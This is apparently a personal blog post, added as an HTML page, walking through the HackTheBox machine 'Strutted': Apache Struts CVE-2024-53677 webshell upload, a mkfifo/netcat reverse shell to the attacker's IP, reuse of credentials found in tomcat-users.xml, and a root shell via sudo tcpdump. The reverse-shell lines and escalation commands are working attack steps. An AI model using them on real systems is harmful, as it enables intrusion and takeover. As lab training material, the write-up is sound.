@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Strutted – Will Lindsey</title>
+  <meta name="description" content="A walkthrough of HackTheBox's Strutted – CVE-2024-53677 Apache Struts RCE, hardcoded credentials, and tcpdump sudo escalation.">
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><text y='32' font-size='32'>💻</text></svg>">
+</head>
+<body>
+  <header>
+    <nav>
+      <a href="/" class="site-title">Will Lindsey</a>
+      <ul>
+        <li><a href="/">About</a></li>
+        <li><a href="/blog/">Blog</a></li>
+      </ul>
+    </nav>
+  </header>
+
+  <main>
+    <a href="/blog/" class="back-link">← Blog</a>
+    <div class="post-header">
+      <h1>Strutted</h1>
+      <div class="post-meta">
+        <time>Jun 19, 2025</time>
+        <span class="post-tags">
+          <span class="tag">hack-the-box</span>
+          <span class="tag">medium</span>
+          <span class="tag">struts</span>
+        </span>
+      </div>
+    </div>
+
+    <article>
+      <p>Strutted begins with exploiting <a href="https://nvd.nist.gov/vuln/detail/cve-2024-53677" target="_blank" rel="noopener noreferrer">CVE-2024-53677</a> to gain initial access as the <code>tomcat</code> user. During enumeration, I discover credentials for the <code>james</code> user. With access to <code>james</code>, I escalate privileges by abusing a <code>sudo</code> permission that allows him to execute <code>tcpdump</code> as root, ultimately leading to root access.</p>
+
+      <h2>Nmap Scans</h2>
+
+      <p>Using <code>nmap</code> I find nginx 1.18.0 running on port 80 and ssh running on port 22. Port 80 redirects to <code>strutted.htb</code>. I'll add that to <code>/etc/hosts</code>.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/strutted/writeup]
+└─$ sudo nmap -p- -sC -sV -oN nmap/$(cat box).all.tcp.ports $(cat ip)
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-17 21:36 EDT
+Nmap scan report for 10.10.11.59
+Host is up (0.12s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://strutted.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 257.23 seconds</code></pre>
+
+      <h2>Enumerating Port 80</h2>
+
+      <h3>website_enum</h3>
+      <p>I run a script that scrapes potentially interesting information from the site. Of note, it finds a link to <code>/download.action</code>.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/strutted/writeup]
+└─$ website_enum http://$(cat ip)
+~~~~~~~~Comments~~~~~~~~~~~~
+ Optional JavaScript
+~~~~~~END COMMENTS~~~~~~~~~~~
+~~~~~~~~LINKS~~~~~~~~~~~~~~~~
+/download.action
+#
+/about
+/how
+~~~~~~~~~ACTION BUTTONS~~~~~~
+Input with type 'file' in form with method 'post' found.
+Input with type 'submit' in form with method 'post' found.</code></pre>
+
+      <h3>Browser</h3>
+      <p>Visiting the main page I see the website is serving an image sharing service. The website provides a downloadable zip file that is useful for further enumeration.</p>
+
+      <img src="/assets/img/strutted/1.png" alt="Strutted website home page" class="post-img">
+
+      <p>First I test out the image uploading feature. I upload a small image.</p>
+
+      <img src="/assets/img/strutted/3.png" alt="Image upload test" class="post-img">
+
+      <p>I note the image is uploaded to <code>strutted.htb/uploads/20250618_012810/test.png</code>.</p>
+
+      <img src="/assets/img/strutted/4.png" alt="Uploaded image path" class="post-img">
+
+      <p>From <code>strutted.htb</code>, I click <code>Download</code> resulting in the downloading of <code>strutted.zip</code>. I move the file to my current working directory and unzip it.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/strutted/writeup/zip_files]
+└─$ unzip strutted.zip
+Archive:  strutted.zip
+  inflating: Dockerfile
+  inflating: README.md
+  inflating: context.xml
+   creating: strutted/
+  inflating: strutted/pom.xml
+  &lt;snip&gt;</code></pre>
+
+      <p>Looking at the file <code>strutted/pom.xml</code> I see that struts version 6.3.0.1 is being used.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/…/strutted/writeup/zip_files/strutted]
+└─$ cat pom.xml|grep -i struts
+        &lt;struts2.version&gt;6.3.0.1&lt;/struts2.version&gt;
+                &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;
+                &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;
+                &lt;version&gt;${struts2.version}&lt;/version&gt;</code></pre>
+
+      <p>Notably, this version of Apache Struts is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/cve-2024-53677" target="_blank" rel="noopener noreferrer">CVE-2024-53677</a>. Using this publicly available <a href="https://github.com/EQSTLab/CVE-2024-53677" target="_blank" rel="noopener noreferrer">POC</a> as a reference, I crafted a payload in Burp Suite to exploit the vulnerability. The payload successfully uploads a webshell named <code>shell.jsp</code>. My modifications to the original POC focused on bypassing upload restrictions.</p>
+
+      <img src="/assets/img/strutted/burppayload.png" alt="Burp Suite payload for CVE-2024-53677" class="post-img">
+
+      <p>After submitting this POST request, I have successfully uploaded a web shell executing commands as <code>tomcat</code>.</p>
+
+      <img src="/assets/img/strutted/2.png" alt="Webshell executing as tomcat" class="post-img">
+
+      <p>I create a reverse shell script called <code>shell.sh</code> and serve it on port 80 from my machine.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/strutted/writeup]
+└─$ cat shell.sh
+#!/bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.8 9595 &gt;/tmp/f
+
+┌──(kali㉿kali)-[~/htb/strutted/writeup]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</code></pre>
+
+      <p>I intercept the request to <code>shell.jsp</code> in Burp and use Repeater to issue a command that downloads <code>shell.sh</code> to the target machine.</p>
+
+      <img src="/assets/img/strutted/5.png" alt="Burp Repeater downloading shell.sh" class="post-img">
+
+<pre><code>10.10.11.59 - - [18/Jun/2025 21:24:25] "GET /shell.sh HTTP/1.1" 200 -</code></pre>
+
+      <p>I set up a <code>nc</code> listener on port 9595 and execute my reverse shell script using <code>shell.jsp</code>.</p>
+
+      <img src="/assets/img/strutted/6.png" alt="Executing shell.sh via webshell" class="post-img">
+
+<pre><code>┌──(kali㉿kali)-[~/htb/strutted/writeup]
+└─$ nc -lvnp 9595
+listening on [any] 9595 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.10.11.59] 42636
+/bin/sh: 0: can't access tty; job control turned off
+$</code></pre>
+
+      <p>I upgrade my shell to be fully interactive.</p>
+
+<pre><code>$ python3 -c 'import pty;pty.spawn("/bin/bash");'
+tomcat@strutted:~$ ^Z
+zsh: suspended  nc -lvnp 9595
+
+┌──(kali㉿kali)-[~/htb/strutted/writeup]
+└─$ stty raw -echo; fg % 1
+[1]  + continued  nc -lvnp 9595
+                               export TERM=screen
+tomcat@strutted:~$ stty rows 55 columns 230
+tomcat@strutted:~$</code></pre>
+
+      <h2>User james</h2>
+
+      <p>Looking in the directory <code>/home</code> I see the home directory for the user <code>james</code>. Inside my current directory I find a <code>conf</code> directory. Inside the conf directory I find the password <code>IT14d6SSP81k</code>.</p>
+
+<pre><code>tomcat@strutted:~/conf$ grep -ir pass .
+./tomcat-users.xml:  &lt;user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/&gt;
+...</code></pre>
+
+      <p>I successfully connect to the machine over SSH with the credentials <code>james:IT14d6SSP81k</code>.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/strutted/writeup]
+└─$ ssh james@$(cat ip)
+james@10.10.11.59's password:
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-130-generic x86_64)
+
+james@strutted:~$ cat user.txt |wc
+      1       1      33</code></pre>
+
+      <h2>Root</h2>
+
+      <p>The user <code>james</code> can execute <code>tcpdump</code> as root.</p>
+
+<pre><code>james@strutted:~$ sudo -l
+Matching Defaults entries for james on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
+    use_pty
+
+User james may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/sbin/tcpdump</code></pre>
+
+      <p><a href="https://gtfobins.github.io/gtfobins/tcpdump/" target="_blank" rel="noopener noreferrer">GTFOBins</a> has a documented way to escalate privileges given the user can execute <code>tcpdump</code> as root. Below I use the method described by GTFOBins to get a reverse shell as root.</p>
+
+<pre><code>james@strutted:~$ RESHELL='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.8 9595 &gt;/tmp/f'
+james@strutted:~$ TF=$(mktemp)
+james@strutted:~$ echo "$RESHELL" &gt; $TF
+james@strutted:~$ chmod +x $TF
+james@strutted:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+4 packets received by filter
+0 packets dropped by kernel</code></pre>
+
+      <p>This shell is caught on my local machine.</p>
+
+<pre><code>┌──(kali㉿kali)-[~/htb/strutted/writeup]
+└─$ nc -lvnp 9595
+listening on [any] 9595 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.10.11.59] 52712
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cat /root/root.txt |wc
+      1       1      33</code></pre>
+    </article>
+  </main>
+
+  <footer>
+    &copy; 2026 Will Lindsey
+  </footer>
+</body>
+</html>
